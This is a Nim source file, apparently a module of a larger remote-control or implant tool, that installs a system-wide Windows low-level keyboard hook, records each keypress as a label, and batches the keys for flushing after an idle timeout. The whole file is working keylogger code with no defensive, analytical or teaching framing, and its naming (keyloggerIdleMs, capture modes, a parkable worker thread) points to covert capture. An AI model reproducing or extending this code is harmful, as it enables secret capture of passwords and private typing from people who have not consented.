from std/locks import acquire, release
import ../../utils/winapi/handlers
import ../../utils/winapi/utils
import ./shared

const
  whKeyboardLl = 13
  wmKeydown = 0x0100'u32
  wmSyskeydown = 0x0104'u32
  pmRemove = 0x0001'u32

var
  hookHandle: pointer = nil
  hookThreadId: culong = 0

proc keyboardHookProc(code: int32; wParam: culong; lParam: pointer): culong {.stdcall.} =
  # Receives a low level keyboard hook event
  if code >= 0:
    ensureKlMtx()
    acquire(klMtx)
    let on = active and captureMode == cmKeystate
    release(klMtx)
    if on and (wParam == wmKeydown or wParam == wmSyskeydown) and lParam != nil:
      let kb = cast[ptr KbdLlHookStruct](lParam)
      addKey(vkLabel(kb.vkCode.int32))
  if hookHandle != nil:
    result = callNextHookEx(hookHandle, code, wParam, lParam)
  else:
    result = 0

proc workerKeystate*(_: pointer) {.stdcall.} =
  # Worker that captures keys through a hook
  hookThreadId = getCurrentThreadId()
  hookHandle = setWindowsHookExW(whKeyboardLl, cast[pointer](keyboardHookProc), nil, 0)
  if hookHandle == nil:
    ensureKlMtx()
    acquire(klMtx)
    parked = true
    active = false
    release(klMtx)
    return
  defer:
    if hookHandle != nil:
      discard unhookWindowsHookEx(hookHandle)
      hookHandle = nil

  var msg: WinMsg
  while true:
    ensureKlMtx()
    acquire(klMtx)
    let runHook = active and captureMode == cmKeystate
    if not runHook:
      parked = true
      release(klMtx)
      discard peekMessageW(addr msg, nil, 0, 0, pmRemove)
      sleepMs(50)
      continue
    parked = false
    release(klMtx)

    if peekMessageW(addr msg, nil, 0, 0, pmRemove) != 0:
      discard dispatchMessageW(addr msg)
    else:
      sleepMs(10)
    ensureKlMtx()
    acquire(klMtx)
    let pending = batch.len > 0
    let lastKey = klLastKeyMs
    release(klMtx)
    if pending and lastKey > 0 and getTickCount64() - lastKey >= keyloggerIdleMs:
      flushBatch()
      acquire(klMtx)
      klLastKeyMs = 0
      release(klMtx)

proc notifyKeystateStop*() =
  # Posts a quit message to the hook thread
  if hookThreadId != 0:
    discard postThreadMessageW(hookThreadId, 0x0012'u32, 0, 0)
